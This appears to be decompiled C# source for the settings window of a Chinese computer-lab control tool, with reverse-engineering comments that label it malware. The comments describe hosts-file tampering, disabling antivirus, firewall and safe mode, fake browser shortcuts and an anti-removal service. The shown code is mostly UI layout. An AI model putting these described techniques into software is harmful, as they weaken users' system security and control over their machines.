using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using WindowsApplication1.Internal;

namespace WindowsApplication1
{
		/// <summary>
		/// 恶意软件"机房管理助手"的主设置界面（窗体标题"设 置"），程序自称机房管理小助手（官网 www.jfglzs.com）。
		/// 保存设置时以管理员身份对学生机批量施加限制：禁用 USB/杀软/CMD/注册表编辑器/小游戏、篡改 hosts 屏蔽网站、
		/// 替换桌面浏览器快捷方式为假浏览器、创建防删除服务 zmserv、隐藏文件、关闭防火墙与安全模式、禁用 IPv6，最后杀 explorer 重启外壳。
		/// 本窗体由 load 密码门验证通过后经 Reader.MyForms.Form1.Show() 显示。
		/// </summary>
	// Token: 0x02000008 RID: 8
	[DesignerGenerated]
	public partial class Form1 : Form
	{
		/// <summary>
		/// 构造：挂 FormClosing→Form_FormClosing_ExitApp、Load→Form_Load_ReadConfigAndPopulate；
		/// 初始化 hosts 路径/hosts 备份路径/c:\windows\jf/www.zmyxl2008.com/学生端路径，最后 BuildUi_CreateAllControls() 构建全部控件。
		/// </summary>
		// Token: 0x06000029 RID: 41 RVA: 0x00002A90 File Offset: 0x00000C90
		public Form1()
		{
			base.FormClosing += this.Form_FormClosing_ExitApp;
			base.Load += this.Form_Load_ReadConfigAndPopulate;
			this.hostsFilePath = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts";
			this.hostsBackupPath = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts-bak";
			this.hiddenBackupDir = "c:\\windows\\jf";
			this.blacklistServerDomain = "www.zmyxl2008.com";
			this.hostsAbsolutePath = "C:\\Windows\\System32\\drivers\\etc\\hosts";
			this.blacklistApplied = false;
			this.studentExePath = "";
			this.BuildUi_CreateAllControls();
		}

		/// <summary>
		/// 在代码里手工创建全部界面控件（反编译器把 Designer 初始化合并到此方法）：
		/// 含按钮/单选组（USB 检查、杀毒检查、CMD、右键、小游戏、编号、下载、高危、注册表）/壁纸选择/帮助链接等。
		/// </summary>
		// Token: 0x0600002B RID: 43 RVA: 0x00002B70 File Offset: 0x00000D70
		private void BuildUi_CreateAllControls()
		{
			this.Button1 = new Button();
			this.RadioButton1 = new RadioButton();
			this.RadioButton2 = new RadioButton();
			this.RadioButton4 = new RadioButton();
			this.RadioButton3 = new RadioButton();
			this.RadioButton6 = new RadioButton();
			this.RadioButton5 = new RadioButton();
			this.OpenFileDialog1 = new OpenFileDialog();
			this.Button2 = new Button();
			this.GroupBox4 = new GroupBox();
			this.Label4 = new Label();
			this.Button3 = new Button();
			this.TextBox1 = new TextBox();
			this.Label1 = new Label();
			this.GroupBox5 = new GroupBox();
			this.Label8 = new Label();
			this.pd_new = new TextBox();
			this.Label2 = new Label();
			this.RadioButton10 = new RadioButton();
			this.RadioButton9 = new RadioButton();
			this.Label10 = new Label();
			this.RadioButton12 = new RadioButton();
			this.RadioButton11 = new RadioButton();
			this.GroupBox10 = new GroupBox();
			this.Button_restorepic = new Button();
			this.Button_selectpic = new Button();
			this.GroupBox9 = new GroupBox();
			this.RadioButton13 = new RadioButton();
			this.RadioButton14 = new RadioButton();
			this.Label11 = new Label();
			this.Label12 = new Label();
			this.Label13 = new Label();
			this.Label15 = new Label();
			this.Label16 = new Label();
			this.GroupBox1 = new GroupBox();
			this.GroupBox2 = new GroupBox();
			this.GroupBox3 = new GroupBox();
			this.GroupBox7 = new GroupBox();
			this.GroupBox12 = new GroupBox();
			this.Label7 = new Label();
			this.Label5 = new Label();
			this.Label9 = new Label();
			this.LinkLabel2 = new LinkLabel();
			this.Label14 = new Label();
			this.Label3 = new Label();
			this.Label6 = new Label();
			this.Label17 = new Label();
			this.GroupBox6 = new GroupBox();
			this.RadioButton8 = new RadioButton();
			this.RadioButton7 = new RadioButton();
			this.Label18 = new Label();
			this.GroupBox8 = new GroupBox();
			this.RadioButton16 = new RadioButton();
			this.RadioButton15 = new RadioButton();
			this.RadioButton17 = new RadioButton();
			this.Label19 = new Label();
			this.Label20 = new Label();
			this.Label21 = new Label();
			this.GroupBox11 = new GroupBox();
			this.RadioButton19 = new RadioButton();
			this.RadioButton20 = new RadioButton();
			this.Label22 = new Label();
			this.Label23 = new Label();
			this.GroupBox4.SuspendLayout();
			this.GroupBox5.SuspendLayout();
			this.GroupBox10.SuspendLayout();
			this.GroupBox9.SuspendLayout();
			this.GroupBox1.SuspendLayout();
			this.GroupBox2.SuspendLayout();
			this.GroupBox3.SuspendLayout();
			this.GroupBox7.SuspendLayout();
			this.GroupBox12.SuspendLayout();
			this.GroupBox6.SuspendLayout();
			this.GroupBox8.SuspendLayout();
			this.GroupBox11.SuspendLayout();
			this.SuspendLayout();
			this.Button1.Font = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
			Control button = this.Button1;
			Point location = new Point(728, 638);
			button.Location = location;
			this.Button1.Name = "Button1";
			Control button2 = this.Button1;
			Size size = new Size(118, 33);
			button2.Size = size;
			this.Button1.TabIndex = 0;
			this.Button1.Text = "保存设置(需10秒)";
			this.Button1.UseVisualStyleBackColor = true;
			this.RadioButton1.AutoSize = true;
			Control radioButton = this.RadioButton1;
			location = new Point(6, 11);
			radioButton.Location = location;
			this.RadioButton1.Name = "RadioButton1";
			Control radioButton2 = this.RadioButton1;
			size = new Size(53, 16);
			radioButton2.Size = size;
			this.RadioButton1.TabIndex = 11;
			this.RadioButton1.Text = "允 许";
			this.RadioButton1.UseVisualStyleBackColor = true;
			this.RadioButton2.AutoSize = true;
			this.RadioButton2.Checked = true;
			Control radioButton3 = this.RadioButton2;
			location = new Point(81, 11);
			radioButton3.Location = location;
			this.RadioButton2.Name = "RadioButton2";
			Control radioButton4 = this.RadioButton2;
			size = new Size(53, 16);
			radioButton4.Size = size;
			this.RadioButton2.TabIndex = 12;
			this.RadioButton2.TabStop = true;
			this.RadioButton2.Text = "禁 止";
			this.RadioButton2.UseVisualStyleBackColor = true;
			this.RadioButton4.AutoSize = true;
			this.RadioButton4.Checked = true;
			Control radioButton5 = this.RadioButton4;
			location = new Point(82, 11);
			radioButton5.Location = location;
			this.RadioButton4.Name = "RadioButton4";
			Control radioButton6 = this.RadioButton4;
			size = new Size(53, 16);
			radioButton6.Size = size;
			this.RadioButton4.TabIndex = 1;
			this.RadioButton4.TabStop = true;
			this.RadioButton4.Text = "禁 止";
			this.RadioButton4.UseVisualStyleBackColor = true;
			this.RadioButton3.AutoSize = true;
			Control radioButton7 = this.RadioButton3;
			location = new Point(7, 11);
			radioButton7.Location = location;
			this.RadioButton3.Name = "RadioButton3";
			Control radioButton8 = this.RadioButton3;
			size = new Size(47, 16);
			radioButton8.Size = size;
			this.RadioButton3.TabIndex = 0;
			this.RadioButton3.Text = "允许";
			this.RadioButton3.UseVisualStyleBackColor = true;
			this.RadioButton6.AutoSize = true;
			this.RadioButton6.Checked = true;
			Control radioButton9 = this.RadioButton6;
			location = new Point(81, 11);
			radioButton9.Location = location;
			this.RadioButton6.Name = "RadioButton6";
			Control radioButton10 = this.RadioButton6;
			size = new Size(53, 16);
			radioButton10.Size = size;
			this.RadioButton6.TabIndex = 1;
			this.RadioButton6.TabStop = true;
			this.RadioButton6.Text = "禁 止";
			this.RadioButton6.UseVisualStyleBackColor = true;
			this.RadioButton5.AutoSize = true;
			Control radioButton11 = this.RadioButton5;
			location = new Point(6, 11);
			radioButton11.Location = location;
			this.RadioButton5.Name = "RadioButton5";
			Control radioButton12 = this.RadioButton5;
			size = new Size(47, 16);
			radioButton12.Size = size;
			this.RadioButton5.TabIndex = 0;
			this.RadioButton5.Text = "允许";
			this.RadioButton5.UseVisualStyleBackColor = true;
			this.OpenFileDialog1.FileName = "OpenFileDialog1";
			this.OpenFileDialog1.Filter = "exe文件 |*.exe";
			this.OpenFileDialog1.InitialDirectory = "C:\\Program Files (x86)";
			Control button3 = this.Button2;
			location = new Point(25, 50);
			button3.Location = location;
			this.Button2.Name = "Button2";
			Control button4 = this.Button2;
			size = new Size(123, 27);
			button4.Size = size;
			this.Button2.TabIndex = 16;
			this.Button2.Text = "手动选择学生端文件";
			this.Button2.UseVisualStyleBackColor = true;
			this.GroupBox4.Controls.Add(this.Label4);
			this.GroupBox4.Controls.Add(this.Button3);
			this.GroupBox4.Controls.Add(this.TextBox1);
			this.GroupBox4.Controls.Add(this.Button2);
			this.GroupBox4.Controls.Add(this.Label1);
			Control groupBox = this.GroupBox4;
			location = new Point(56, 12);
			groupBox.Location = location;
			this.GroupBox4.Name = "GroupBox4";
			Control groupBox2 = this.GroupBox4;
			size = new Size(738, 85);
			groupBox2.Size = size;
			this.GroupBox4.TabIndex = 17;
			this.GroupBox4.TabStop = false;
			this.GroupBox4.Text = "1、电子教室学生端的文件名和路径";
			this.Label4.AutoSize = true;
			this.Label4.Font = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
			Control label = this.Label4;
			location = new Point(184, 67);
			label.Location = location;
			this.Label4.Name = "Label4";
			Control label2 = this.Label4;
			size = new Size(401, 12);
			label2.Size = size;
			this.Label4.TabIndex = 21;
			this.Label4.Text = "（红蜘蛛:C:\\Program Files (x86)\\3000soft\\Red Spider\\REDAgent.exe）";
			this.Button3.Font = new Font("宋体", 9f);
			Control button5 = this.Button3;
			location = new Point(633, 47);
			button5.Location = location;
			this.Button3.Name = "Button3";
			Control button6 = this.Button3;
			size = new Size(81, 27);
			button6.Size = size;
			this.Button3.TabIndex = 20;
			this.Button3.Text = "设置方法";
			this.Button3.UseVisualStyleBackColor = true;
			this.TextBox1.Font = new Font("宋体", 9f);
			Control textBox = this.TextBox1;
			location = new Point(25, 20);
			textBox.Location = location;
			this.TextBox1.Name = "TextBox1";
			Control textBox2 = this.TextBox1;
			size = new Size(689, 21);
			textBox2.Size = size;
			this.TextBox1.TabIndex = 19;
			this.Label1.AutoSize = true;
			this.Label1.Font = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
			Control label3 = this.Label1;
			location = new Point(184, 48);
			label3.Location = location;
			this.Label1.Name = "Label1";
			Control label4 = this.Label1;
			size = new Size(401, 12);
			label4.Size = size;
			this.Label1.TabIndex = 17;
			this.Label1.Text = "（极域:c:\\.\\StudentMain.exe，锐捷云课堂:E:\\..\\ClassMangerApp.exe）";
			this.GroupBox5.Controls.Add(this.Label8);
			this.GroupBox5.Controls.Add(this.pd_new);
			Control groupBox3 = this.GroupBox5;
			location = new Point(56, 491);
			groupBox3.Location = location;
			this.GroupBox5.Name = "GroupBox5";
			Control groupBox4 = this.GroupBox5;
			size = new Size(520, 57);
			groupBox4.Size = size;
			this.GroupBox5.TabIndex = 19;
			this.GroupBox5.TabStop = false;
			this.GroupBox5.Text = "10、设置密码（因极域密码容易查看到，所以本密码不要与极域密码相同）";
			this.Label8.AutoSize = true;
			Control label5 = this.Label8;
			location = new Point(347, 28);
			label5.Location = location;
			this.Label8.Name = "Label8";
			Control label6 = this.Label8;
			size = new Size(155, 12);
			label6.Size = size;
			this.Label8.TabIndex = 3;
			this.Label8.Text = "（6位及以上的字母或数字）";
			Control pd_new = this.pd_new;
			location = new Point(154, 25);
			pd_new.Location = location;
			this.pd_new.Name = "pd_new";
			this.pd_new.PasswordChar = '*';
			Control pd_new2 = this.pd_new;
			size = new Size(192, 21);
			pd_new2.Size = size;
			this.pd_new.TabIndex = 1;
			this.Label2.AutoSize = true;
			this.Label2.ForeColor = Color.Red;
			Control label7 = this.Label2;
			location = new Point(73, 545);
			label7.Location = location;
			this.Label2.Name = "Label2";
			Control label8 = this.Label2;
			size = new Size(0, 12);
			label8.Size = size;
			this.Label2.TabIndex = 4;
			this.RadioButton10.AutoSize = true;
			Control radioButton13 = this.RadioButton10;
			location = new Point(8, 12);
			radioButton13.Location = location;
			this.RadioButton10.Name = "RadioButton10";
			Control radioButton14 = this.RadioButton10;
			size = new Size(59, 16);
			radioButton14.Size = size;
			this.RadioButton10.TabIndex = 1;
			this.RadioButton10.Text = "不显示";
			this.RadioButton10.UseVisualStyleBackColor = true;
			this.RadioButton9.AutoSize = true;
			this.RadioButton9.Checked = true;
			Control radioButton15 = this.RadioButton9;
			location = new Point(82, 11);
			radioButton15.Location = location;
			this.RadioButton9.Name = "RadioButton9";
			Control radioButton16 = this.RadioButton9;
			size = new Size(53, 16);
			radioButton16.Size = size;
			this.RadioButton9.TabIndex = 0;
			this.RadioButton9.TabStop = true;
			this.RadioButton9.Text = "显 示";
			this.RadioButton9.UseVisualStyleBackColor = true;
			this.Label10.AutoSize = true;
			this.Label10.ForeColor = Color.DarkRed;
			Control label9 = this.Label10;
			location = new Point(403, 244);
			label9.Location = location;
			this.Label10.Name = "Label10";
			Control label10 = this.Label10;
			size = new Size(443, 12);
			label10.Size = size;
			this.Label10.TabIndex = 2;
			this.Label10.Text = "（强烈建议禁止，学生按win+Tab或在任务栏上点右键，可用虚拟桌面来脱离控制）";
			this.RadioButton12.AutoSize = true;
			this.RadioButton12.Checked = true;
			Control radioButton17 = this.RadioButton12;
			location = new Point(81, 11);
			radioButton17.Location = location;
			this.RadioButton12.Name = "RadioButton12";
			Control radioButton18 = this.RadioButton12;
			size = new Size(59, 16);
			radioButton18.Size = size;
			this.RadioButton12.TabIndex = 1;
			this.RadioButton12.TabStop = true;
			this.RadioButton12.Text = "禁 止 ";
			this.RadioButton12.UseVisualStyleBackColor = true;
			this.RadioButton11.AutoSize = true;
			Control radioButton19 = this.RadioButton11;
			location = new Point(7, 11);
			radioButton19.Location = location;
			this.RadioButton11.Name = "RadioButton11";
			Control radioButton20 = this.RadioButton11;
			size = new Size(53, 16);
			radioButton20.Size = size;
			this.RadioButton11.TabIndex = 0;
			this.RadioButton11.Text = "允 许";
			this.RadioButton11.UseVisualStyleBackColor = true;
			this.GroupBox10.Controls.Add(this.Button_restorepic);
			this.GroupBox10.Controls.Add(this.Button_selectpic);
			Control groupBox_ = this.GroupBox10;
			location = new Point(56, 563);
			groupBox_.Location = location;
			this.GroupBox10.Name = "GroupBox10";
			Control groupBox_2 = this.GroupBox10;
			size = new Size(520, 62);
			groupBox_2.Size = size;
			this.GroupBox10.TabIndex = 23;
			this.GroupBox10.TabStop = false;
			this.GroupBox10.Text = "11、可选：设置学生电脑桌面";
			Control button_restorepic = this.Button_restorepic;
			location = new Point(371, 20);
			button_restorepic.Location = location;
			this.Button_restorepic.Name = "Button_restorepic";
			Control button_restorepic2 = this.Button_restorepic;
			size = new Size(131, 29);
			button_restorepic2.Size = size;
			this.Button_restorepic.TabIndex = 1;
			this.Button_restorepic.Text = "恢复windows默认桌面";
			this.Button_restorepic.UseVisualStyleBackColor = true;
			Control button_selectpic = this.Button_selectpic;
			location = new Point(200, 20);
			button_selectpic.Location = location;
			this.Button_selectpic.Name = "Button_selectpic";
			Control button_selectpic2 = this.Button_selectpic;
			size = new Size(127, 29);
			button_selectpic2.Size = size;
			this.Button_selectpic.TabIndex = 0;
			this.Button_selectpic.Text = "选择背景图(内含6张)";
			this.Button_selectpic.UseVisualStyleBackColor = true;
			this.GroupBox9.Controls.Add(this.RadioButton13);
			this.GroupBox9.Controls.Add(this.RadioButton14);
			Control groupBox5 = this.GroupBox9;
			location = new Point(56, 424);
			groupBox5.Location = location;
			this.GroupBox9.Name = "GroupBox9";
			Control groupBox6 = this.GroupBox9;
			size = new Size(520, 53);
			groupBox6.Size = size;
			this.GroupBox9.TabIndex = 15;
			this.GroupBox9.TabStop = false;
			this.GroupBox9.Text = "9、扫雷、纸牌、拼图板、谷歌浏览器的小恐龙、Edge浏览器的冲浪等小游戏";
			this.RadioButton13.AutoSize = true;
			this.RadioButton13.Checked = true;
			Control radioButton21 = this.RadioButton13;
			location = new Point(277, 28);
			radioButton21.Location = location;
			this.RadioButton13.Name = "RadioButton13";
			Control radioButton22 = this.RadioButton13;
			size = new Size(53, 16);
			radioButton22.Size = size;
			this.RadioButton13.TabIndex = 1;
			this.RadioButton13.TabStop = true;
			this.RadioButton13.Text = "禁 止";
			this.RadioButton13.UseVisualStyleBackColor = true;
			this.RadioButton14.AutoSize = true;
			Control radioButton23 = this.RadioButton14;
			location = new Point(202, 28);
			radioButton23.Location = location;
			this.RadioButton14.Name = "RadioButton14";
			Control radioButton24 = this.RadioButton14;
			size = new Size(53, 16);
			radioButton24.Size = size;
			this.RadioButton14.TabIndex = 0;
			this.RadioButton14.Text = "允 许";
			this.RadioButton14.UseVisualStyleBackColor = true;
			this.Label11.AutoSize = true;
			Control label11 = this.Label11;
			location = new Point(65, 120);
			label11.Location = location;
			this.Label11.Name = "Label11";
			Control label12 = this.Label11;
			size = new Size(101, 12);
			label12.Size = size;
			this.Label11.TabIndex = 24;
			this.Label11.Text = "2、USB存储设备：";
			this.Label12.AutoSize = true;
			Control label13 = this.Label12;
			location = new Point(64, 158);
			label13.Location = location;
			this.Label12.Name = "Label12";
			Control label14 = this.Label12;
			size = new Size(83, 12);
			label14.Size = size;
			this.Label12.TabIndex = 25;
			this.Label12.Text = "3、杀毒软件：";
			this.Label13.AutoSize = true;
			Control label15 = this.Label13;
			location = new Point(64, 200);
			label15.Location = location;
			this.Label13.Name = "Label13";
			Control label16 = this.Label13;
			size = new Size(95, 12);
			label16.Size = size;
			this.Label13.TabIndex = 26;
			this.Label13.Text = "4、命令提示符：";
			this.Label15.AutoSize = true;
			Control label17 = this.Label15;
			location = new Point(65, 240);
			label17.Location = location;
			this.Label15.Name = "Label15";
			Control label18 = this.Label15;
			size = new Size(173, 12);
			label18.Size = size;
			this.Label15.TabIndex = 28;
			this.Label15.Text = "5、windows键和任务栏的右键：";
			this.Label16.AutoSize = true;
			Control label19 = this.Label16;
			location = new Point(64, 283);
			label19.Location = location;
			this.Label16.Name = "Label16";
			Control label20 = this.Label16;
			size = new Size(197, 12);
			label20.Size = size;
			this.Label16.TabIndex = 29;
			this.Label16.Text = "6、机器编号（取计算机名的后6位）";
			this.GroupBox1.Controls.Add(this.RadioButton1);
			this.GroupBox1.Controls.Add(this.RadioButton2);
			Control groupBox7 = this.GroupBox1;
			location = new Point(252, 105);
			groupBox7.Location = location;
			this.GroupBox1.Name = "GroupBox1";
			Control groupBox8 = this.GroupBox1;
			size = new Size(149, 33);
			groupBox8.Size = size;
			this.GroupBox1.TabIndex = 30;
			this.GroupBox1.TabStop = false;
			this.GroupBox2.Controls.Add(this.RadioButton4);
			this.GroupBox2.Controls.Add(this.RadioButton3);
			Control groupBox9 = this.GroupBox2;
			location = new Point(252, 146);
			groupBox9.Location = location;
			this.GroupBox2.Name = "GroupBox2";
			Control groupBox10 = this.GroupBox2;
			size = new Size(150, 33);
			groupBox10.Size = size;
			this.GroupBox2.TabIndex = 31;
			this.GroupBox2.TabStop = false;
			this.GroupBox3.Controls.Add(this.RadioButton6);
			this.GroupBox3.Controls.Add(this.RadioButton5);
			Control groupBox11 = this.GroupBox3;
			location = new Point(252, 190);
			groupBox11.Location = location;
			this.GroupBox3.Name = "GroupBox3";
			Control groupBox12 = this.GroupBox3;
			size = new Size(149, 33);
			groupBox12.Size = size;
			this.GroupBox3.TabIndex = 32;
			this.GroupBox3.TabStop = false;
			this.GroupBox7.Controls.Add(this.RadioButton12);
			this.GroupBox7.Controls.Add(this.RadioButton11);
			Control groupBox13 = this.GroupBox7;
			location = new Point(252, 229);
			groupBox13.Location = location;
			this.GroupBox7.Name = "GroupBox7";
			Control groupBox14 = this.GroupBox7;
			size = new Size(150, 33);
			groupBox14.Size = size;
			this.GroupBox7.TabIndex = 32;
			this.GroupBox7.TabStop = false;
			this.GroupBox12.Controls.Add(this.RadioButton10);
			this.GroupBox12.Controls.Add(this.RadioButton9);
			Control groupBox_3 = this.GroupBox12;
			location = new Point(252, 269);
			groupBox_3.Location = location;
			this.GroupBox12.Name = "GroupBox12";
			Control groupBox_4 = this.GroupBox12;
			size = new Size(149, 33);
			groupBox_4.Size = size;
			this.GroupBox12.TabIndex = 32;
			this.GroupBox12.TabStop = false;
			this.Label7.AutoSize = true;
			this.Label7.ForeColor = Color.Black;
			Control label21 = this.Label7;
			location = new Point(402, 203);
			label21.Location = location;
			this.Label7.Name = "Label7";
			Control label22 = this.Label7;
			size = new Size(401, 12);
			label22.Size = size;
			this.Label7.TabIndex = 35;
			this.Label7.Text = "（建议禁止，DEV C++ 在win7运行可以显示结果2秒，win10上可长期显示）";
			this.Label5.AutoSize = true;
			this.Label5.ForeColor = Color.Black;
			Control label23 = this.Label5;
			location = new Point(31, 721);
			label23.Location = location;
			this.Label5.Name = "Label5";
			Control label24 = this.Label5;
			size = new Size(239, 12);
			label24.Size = size;
			this.Label5.TabIndex = 36;
			this.Label5.Text = "但不能禁止360等其它浏览器下载，不能禁止";
			this.Label9.AutoSize = true;
			this.Label9.ForeColor = Color.Black;
			Control label25 = this.Label9;
			location = new Point(34, 747);
			label25.Location = location;
			this.Label9.Name = "Label9";
			Control label26 = this.Label9;
			size = new Size(341, 12);
			label26.Size = size;
			this.Label9.TabIndex = 37;
			this.Label9.Text = "浏览器，win10和win11只保留edge浏览器，最后再在这里设置。";
			this.LinkLabel2.AutoSize = true;
			this.LinkLabel2.BackColor = Color.Transparent;
			this.LinkLabel2.LinkColor = Color.FromArgb(0, 0, 192);
			Control linkLabel = this.LinkLabel2;
			location = new Point(389, 747);
			linkLabel.Location = location;
			this.LinkLabel2.Name = "LinkLabel2";
			Control linkLabel2 = this.LinkLabel2;
			size = new Size(143, 12);
			linkLabel2.Size = size;
			this.LinkLabel2.TabIndex = 39;
			this.LinkLabel2.TabStop = true;
			this.LinkLabel2.Text = "chrome浏览器下载地址>>>";
			this.Label14.AutoSize = true;
			this.Label14.ForeColor = Color.Black;
			Control label27 = this.Label14;
			location = new Point(400, 160);
			label27.Location = location;
			this.Label14.Name = "Label14";
			Control label28 = this.Label14;
			size = new Size(293, 12);
			label28.Size = size;
			this.Label14.TabIndex = 40;
			this.Label14.Text = "（建议禁止，学生可用杀毒软件的\"粉碎文件\"等功能）";
			this.Label3.AutoSize = true;
			Control label29 = this.Label3;
			location = new Point(30, 696);
			label29.Location = location;
			this.Label3.Name = "Label3";
			Control label30 = this.Label3;
			size = new Size(905, 12);
			label30.Size = size;
			this.Label3.TabIndex = 41;
			this.Label3.Text = "注：网上有专门软件来破解小助手，强烈建议禁止浏览器下载文件。禁止后，学生可以在浏览器中复制图片，然后粘贴。本软件可禁止chrome、edge、firfox、IE的下载，";
			this.Label6.AutoSize = true;
			Control label31 = this.Label6;
			location = new Point(273, 721);
			label31.Location = location;
			this.Label6.Name = "Label6";
			Control label32 = this.Label6;
			size = new Size(521, 12);
			label32.Size = size;
			this.Label6.TabIndex = 42;
			this.Label6.Text = "假chrome(显示:谷歌浏览器)的小恐龙游戏，所以要先卸载一些浏览器，win7只保留google chrome";
			this.Label17.AutoSize = true;
			Control label33 = this.Label17;
			location = new Point(62, 653);
			label33.Location = location;
			this.Label17.Name = "Label17";
			Control label34 = this.Label17;
			size = new Size(221, 12);
			label34.Size = size;
			this.Label17.TabIndex = 33;
			this.Label17.Text = "12、浏览器下载软件和设置文件夹选项：";
			this.GroupBox6.Controls.Add(this.RadioButton8);
			this.GroupBox6.Controls.Add(this.RadioButton7);
			Control groupBox15 = this.GroupBox6;
			location = new Point(285, 640);
			groupBox15.Location = location;
			this.GroupBox6.Name = "GroupBox6";
			Control groupBox16 = this.GroupBox6;
			size = new Size(165, 33);
			groupBox16.Size = size;
			this.GroupBox6.TabIndex = 33;
			this.GroupBox6.TabStop = false;
			this.RadioButton8.AutoSize = true;
			this.RadioButton8.Checked = true;
			Control radioButton25 = this.RadioButton8;
			location = new Point(94, 11);
			radioButton25.Location = location;
			this.RadioButton8.Name = "RadioButton8";
			Control radioButton26 = this.RadioButton8;
			size = new Size(59, 16);
			radioButton26.Size = size;
			this.RadioButton8.TabIndex = 1;
			this.RadioButton8.TabStop = true;
			this.RadioButton8.Text = "禁 止 ";
			this.RadioButton8.UseVisualStyleBackColor = true;
			this.RadioButton7.AutoSize = true;
			Control radioButton27 = this.RadioButton7;
			location = new Point(16, 11);
			radioButton27.Location = location;
			this.RadioButton7.Name = "RadioButton7";
			Control radioButton28 = this.RadioButton7;
			size = new Size(53, 16);
			radioButton28.Size = size;
			this.RadioButton7.TabIndex = 0;
			this.RadioButton7.Text = "允 许";
			this.RadioButton7.UseVisualStyleBackColor = true;
			this.Label18.AutoSize = true;
			this.Label18.ForeColor = Color.DarkRed;
			Control label35 = this.Label18;
			location = new Point(453, 653);
			label35.Location = location;
			this.Label18.Name = "Label18";
			Control label36 = this.Label18;
			size = new Size(137, 12);
			label36.Size = size;
			this.Label18.TabIndex = 43;
			this.Label18.Text = "（强烈建议禁止！！！）";
			this.GroupBox8.Controls.Add(this.RadioButton16);
			this.GroupBox8.Controls.Add(this.RadioButton15);
			this.GroupBox8.Controls.Add(this.RadioButton17);
			Control groupBox17 = this.GroupBox8;
			location = new Point(255, 311);
			groupBox17.Location = location;
			this.GroupBox8.Name = "GroupBox8";
			Control groupBox18 = this.GroupBox8;
			size = new Size(303, 33);
			groupBox18.Size = size;
			this.GroupBox8.TabIndex = 45;
			this.GroupBox8.TabStop = false;
			this.RadioButton16.AutoSize = true;
			this.RadioButton16.Checked = true;
			Control radioButton29 = this.RadioButton16;
			location = new Point(79, 13);
			radioButton29.Location = location;
			this.RadioButton16.Name = "RadioButton16";
			Control radioButton30 = this.RadioButton16;
			size = new Size(143, 16);
			radioButton30.Size = size;
			this.RadioButton16.TabIndex = 53;
			this.RadioButton16.TabStop = true;
			this.RadioButton16.Text = "仅C++可生成新exe文件";
			this.RadioButton16.UseVisualStyleBackColor = true;
			this.RadioButton15.AutoSize = true;
			Control radioButton31 = this.RadioButton15;
			location = new Point(5, 13);
			radioButton31.Location = location;
			this.RadioButton15.Name = "RadioButton15";
			Control radioButton32 = this.RadioButton15;
			size = new Size(71, 16);
			radioButton32.Size = size;
			this.RadioButton15.TabIndex = 1;
			this.RadioButton15.Text = "全部允许";
			this.RadioButton15.UseVisualStyleBackColor = true;
			this.RadioButton17.AutoSize = true;
			Control radioButton33 = this.RadioButton17;
			location = new Point(227, 13);
			radioButton33.Location = location;
			this.RadioButton17.Name = "RadioButton17";
			Control radioButton34 = this.RadioButton17;
			size = new Size(71, 16);
			radioButton34.Size = size;
			this.RadioButton17.TabIndex = 0;
			this.RadioButton17.Text = "全部禁止";
			this.RadioButton17.UseVisualStyleBackColor = true;
			this.Label19.AutoSize = true;
			Control label37 = this.Label19;
			location = new Point(64, 326);
			label37.Location = location;
			this.Label19.Name = "Label19";
			Control label38 = this.Label19;
			size = new Size(197, 12);
			label38.Size = size;
			this.Label19.TabIndex = 44;
			this.Label19.Text = "7、新的exe、reg、bat等高危文件：";
			this.Label20.AutoSize = true;
			this.Label20.ForeColor = Color.Black;
			Control label39 = this.Label20;
			location = new Point(559, 326);
			label39.Location = location;
			this.Label20.Name = "Label20";
			Control label40 = this.Label20;
			size = new Size(275, 12);
			label40.Size = size;
			this.Label20.TabIndex = 51;
			this.Label20.Text = "（安装软件或复制exe文件到硬盘要先退出小助手）";
			this.Label21.AutoSize = true;
			this.Label21.ForeColor = Color.Black;
			Control label41 = this.Label21;
			location = new Point(564, 375);
			label41.Location = location;
			this.Label21.Name = "Label21";
			Control label42 = this.Label21;
			size = new Size(275, 12);
			label42.Size = size;
			this.Label21.TabIndex = 54;
			this.Label21.Text = "（mpython、考试软件、3d one不能设为完全禁止）";
			this.GroupBox11.Controls.Add(this.RadioButton19);
			this.GroupBox11.Controls.Add(this.RadioButton20);
			Control groupBox_5 = this.GroupBox11;
			location = new Point(255, 362);
			groupBox_5.Location = location;
			this.GroupBox11.Name = "GroupBox11";
			Control groupBox_6 = this.GroupBox11;
			size = new Size(303, 33);
			groupBox_6.Size = size;
			this.GroupBox11.TabIndex = 53;
			this.GroupBox11.TabStop = false;
			this.RadioButton19.AutoSize = true;
			this.RadioButton19.Checked = true;
			Control radioButton35 = this.RadioButton19;
			location = new Point(79, 13);
			radioButton35.Location = location;
			this.RadioButton19.Name = "RadioButton19";
			Control radioButton36 = this.RadioButton19;
			size = new Size(71, 16);
			radioButton36.Size = size;
			this.RadioButton19.TabIndex = 53;
			this.RadioButton19.TabStop = true;
			this.RadioButton19.Text = "自动关闭";
			this.RadioButton19.UseVisualStyleBackColor = true;
			this.RadioButton20.AutoSize = true;
			Control radioButton37 = this.RadioButton20;
			location = new Point(227, 13);
			radioButton37.Location = location;
			this.RadioButton20.Name = "RadioButton20";
			Control radioButton38 = this.RadioButton20;
			size = new Size(71, 16);
			radioButton38.Size = size;
			this.RadioButton20.TabIndex = 0;
			this.RadioButton20.Text = "完全禁止";
			this.RadioButton20.UseVisualStyleBackColor = true;
			this.Label22.AutoSize = true;
			Control label43 = this.Label22;
			location = new Point(62, 377);
			label43.Location = location;
			this.Label22.Name = "Label22";
			Control label44 = this.Label22;
			size = new Size(95, 12);
			label44.Size = size;
			this.Label22.TabIndex = 52;
			this.Label22.Text = "8、注册表编辑：";
			this.Label23.AutoSize = true;
			this.Label23.ForeColor = Color.Black;
			Control label45 = this.Label23;
			location = new Point(402, 118);
			label45.Location = location;
			this.Label23.Name = "Label23";
			Control label46 = this.Label23;
			size = new Size(503, 12);
			label46.Size = size;
			this.Label23.TabIndex = 40;
			this.Label23.Text = "（如果要使用机器人等外部设备，要设为允许，你可使用电子教室控制USB存储的开放和禁止）";
